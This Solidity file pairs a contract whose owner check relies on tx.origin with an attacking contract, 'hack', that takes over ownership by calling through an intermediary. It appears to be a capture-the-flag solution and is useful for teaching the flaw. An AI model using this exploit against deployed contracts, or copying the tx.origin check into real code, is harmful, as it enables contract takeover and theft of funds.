// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Telephone {

  address public owner;

  constructor() {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}
contract hack {
    Telephone target;
    constructor(address _address){
        target = Telephone(_address);
    }
    function attack() public {
        target.changeOwner(0x620dE2FEA8fEAb1888E4d82e57B8b9C3401cC88d);
        require(target.owner() == 0x620dE2FEA8fEAb1888E4d82e57B8b9C3401cC88d , "Hack failed");
    }
}